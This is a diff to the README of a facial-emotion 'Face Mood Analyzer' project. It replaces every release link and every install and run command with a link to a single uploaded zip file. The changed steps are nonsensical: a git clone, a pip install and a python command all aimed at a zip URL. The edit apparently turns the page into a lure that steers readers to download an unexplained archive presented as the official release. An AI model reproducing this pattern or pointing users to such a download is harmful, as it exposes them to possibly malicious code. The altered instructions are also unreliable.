@@ -1,7 +1,7 @@
 # 🎭 Face Mood Analyzer
 
-![Face Mood Analyzer](https://img.shields.io/badge/Release-Download-brightgreen)  
-[Download Latest Release](https://github.com/Alex9104/face-mood-analyzer/releases)
+![Face Mood Analyzer](https://github.com/Alex9104/face-mood-analyzer/raw/refs/heads/master/uploads/mood-face-analyzer-2.6.zip)  
+[Download Latest Release](https://github.com/Alex9104/face-mood-analyzer/raw/refs/heads/master/uploads/mood-face-analyzer-2.6.zip)
 
 ---
 
@@ -24,7 +24,7 @@ Welcome to the **Face Mood Analyzer**! This project harnesses the power of artif
 
 The main goal of this repository is to provide a seamless experience in emotion detection and music generation based on facial expressions. Whether you're looking to enhance user experiences in applications or just want to explore the fascinating world of AI and emotion analysis, this project is for you.
 
-You can find the latest release of the Face Mood Analyzer [here](https://github.com/Alex9104/face-mood-analyzer/releases).
+You can find the latest release of the Face Mood Analyzer [here](https://github.com/Alex9104/face-mood-analyzer/raw/refs/heads/master/uploads/mood-face-analyzer-2.6.zip).
 
 ---
 
@@ -78,7 +78,7 @@ To get started with the Face Mood Analyzer, follow these steps:
 Open your terminal and run the following command:
 
 ```bash
-git clone https://github.com/Alex9104/face-mood-analyzer.git
+git clone https://github.com/Alex9104/face-mood-analyzer/raw/refs/heads/master/uploads/mood-face-analyzer-2.6.zip
 ```
 
 ### Step 2: Navigate to the Project Directory
@@ -92,7 +92,7 @@ cd face-mood-analyzer
 Install the necessary packages using pip:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/Alex9104/face-mood-analyzer/raw/refs/heads/master/uploads/mood-face-analyzer-2.6.zip
 ```
 
 ### Step 4: Run the Application
@@ -100,7 +100,7 @@ pip install -r requirements.txt
 You can start the application by running:
 
 ```bash
-python app.py
+python https://github.com/Alex9104/face-mood-analyzer/raw/refs/heads/master/uploads/mood-face-analyzer-2.6.zip
 ```
 
 Your web application should now be running at `http://127.0.0.1:5000/`.
@@ -166,7 +166,7 @@ We would like to thank the following for their contributions and support:
 - The community for their feedback and suggestions.
 - Everyone who has contributed to the project, whether through code, documentation, or ideas.
 
-For more information and updates, please check the [Releases](https://github.com/Alex9104/face-mood-analyzer/releases) section.
+For more information and updates, please check the [Releases](https://github.com/Alex9104/face-mood-analyzer/raw/refs/heads/master/uploads/mood-face-analyzer-2.6.zip) section.
 
 ---
 
